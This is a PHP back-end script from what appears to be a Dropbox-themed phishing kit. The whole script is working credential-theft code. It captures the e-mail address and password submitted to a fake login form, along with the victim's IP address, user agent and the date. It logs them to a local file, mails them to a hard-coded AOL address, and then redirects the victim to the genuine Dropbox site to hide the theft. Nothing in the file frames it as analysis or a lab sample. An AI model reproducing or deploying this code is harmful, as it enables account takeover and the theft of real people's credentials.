<?

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "----- Dropbox -----\n";
$message .= "E-mail Address: ".$_POST['username']."\n";
$message .= "E-mail Password: ".$_POST['password']."\n";
$message .= "----------\n";
$message .= "User IP : ".$ip."\n";
$message .= "Date : ".$adddate."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= " - New Dropbox -\n";

$recipient = "chianglyn55@aol.com";
$subject = "chocoDropBox";
$file = fopen("drop.txt", "a");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
fputs ($file, "$message\r\n");
fputs ($file, "--------\r\n");
fclose ($file);
$headers .= "New-DP";
mail($recipient,$subject,$message,$headers);?>





<script type="text/javascript">
</script><meta HTTP-EQUIV="REFRESH" content="1; url=http://www.dropbox.com/business">